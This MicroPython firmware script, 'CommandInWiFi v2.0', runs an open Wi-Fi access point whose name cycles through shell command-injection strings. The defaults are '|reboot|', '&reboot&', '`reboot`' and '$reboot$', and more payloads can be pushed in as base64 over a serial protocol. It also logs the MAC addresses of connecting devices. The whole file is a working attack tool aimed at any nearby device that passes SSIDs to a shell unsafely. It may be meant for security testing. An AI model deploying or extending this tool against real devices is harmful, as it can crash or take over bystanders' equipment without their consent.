import network
import time
import sys
import select
import ubinascii

# ── Default SSIDs (used when no payloads pushed via serial) ──────────────
default_ssids = ["|reboot|", "&reboot&", "`reboot`", "$reboot$"]
# Open AP (no password) — SSIDs must be visible to all scanning devices

# ── Dynamic payload queue (filled via CIW serial protocol) ───────────────
payload_queue = []
ssid_index = 0
is_running = False
use_dashboard = False  # True once first CIW command received

# Time intervals
ssid_change_interval = 2 * 60  # 2 minutes in seconds
check_interval = 60  # 1 minute in seconds

# Setup Wi-Fi in AP mode
ap = network.WLAN(network.AP_IF)
ap.active(True)

# Serial poll object for non-blocking stdin reads
poller = select.poll()
poller.register(sys.stdin, select.POLLIN)
serial_buffer = ""


def b64decode(data):
    """Decode base64 string to bytes."""
    return ubinascii.a2b_base64(data).decode("utf-8", "replace")


def get_active_count():
    """Get count of active payloads."""
    return len(payload_queue) if use_dashboard else len(default_ssids)


def get_active_ssid(index):
    """Get SSID at index from active source."""
    if use_dashboard and len(payload_queue) > 0:
        return payload_queue[index % len(payload_queue)]
    return default_ssids[index % len(default_ssids)]


def change_ssid():
    """Change the AP SSID to the next payload in queue."""
    global ssid_index
    count = get_active_count()
    if count == 0:
        return
    new_ssid = get_active_ssid(ssid_index)
    ap.config(essid=new_ssid, authmode=0)
    print("-------------------------------------------------")
    print("CIW:SSID:" + new_ssid)
    print("SSID Changed: " + new_ssid + " | Index: " + str(ssid_index))
    ssid_index = (ssid_index + 1) % count


def list_connected_devices():
    """List connected devices (limited on MicroPython)."""
    print("Checking connected devices...")
    try:
        stations = ap.status("stations")
        for s in stations:
            mac = ubinascii.hexlify(s[0], ":").decode()
            print("CIW:DEVICE:0.0.0.0:" + mac)
    except Exception:
        print("Device listing not supported on this firmware")


def process_command(cmd):
    """Process a CIW protocol command received over serial."""
    global payload_queue, ssid_index, is_running, use_dashboard

    cmd = cmd.strip()
    if not cmd:
        return

    if cmd == "CIW:CLEAR":
        payload_queue = []
        ssid_index = 0
        use_dashboard = True
        print("CIW:OK:CLEAR")

    elif cmd.startswith("CIW:ADD:"):
        b64 = cmd[8:]
        try:
            decoded = b64decode(b64)
            payload_queue.append(decoded)
            use_dashboard = True
            print("CIW:OK:ADD:" + str(len(payload_queue) - 1))
        except Exception as e:
            print("CIW:ERR:Decode failed: " + str(e))

    elif cmd == "CIW:START":
        if get_active_count() == 0:
            print("CIW:ERR:No payloads in queue")
            return
        is_running = True
        ssid_index = 0
        use_dashboard = True
        change_ssid()
        print("CIW:OK:START:" + str(get_active_count()))

    elif cmd == "CIW:STOP":
        is_running = False
        print("CIW:OK:STOP")

    elif cmd == "CIW:STATUS":
        state = "running" if is_running else "stopped"
        print("CIW:STATUS:" + state + ":" + str(get_active_count()) + ":" + str(ssid_index))

    else:
        print("CIW:ERR:Unknown command")


def check_serial():
    """Non-blocking serial read using poll."""
    global serial_buffer
    while poller.poll(0):
        ch = sys.stdin.read(1)
        if ch in ("\n", "\r"):
            if serial_buffer:
                process_command(serial_buffer)
                serial_buffer = ""
        else:
            serial_buffer += ch


# ── Boot ─────────────────────────────────────────────────────────────────
print("CIW:BOOT")
print("CommandInWiFi v2.0 (MicroPython) — CIW Protocol Ready")

change_ssid()
is_running = True
print("Broadcasting default SSIDs.")

# ── Main loop ────────────────────────────────────────────────────────────
last_change = time.time()
last_check = time.time()

while True:
    current_time = time.time()

    # Always check for serial commands (non-blocking)
    check_serial()

    # SSID cycling
    if is_running and current_time - last_change >= ssid_change_interval:
        last_change = current_time
        change_ssid()

    # Device check
    if current_time - last_check >= check_interval:
        last_check = current_time
        list_connected_devices()

    # Short sleep for responsiveness (100ms instead of 1s)
    time.sleep(0.1)
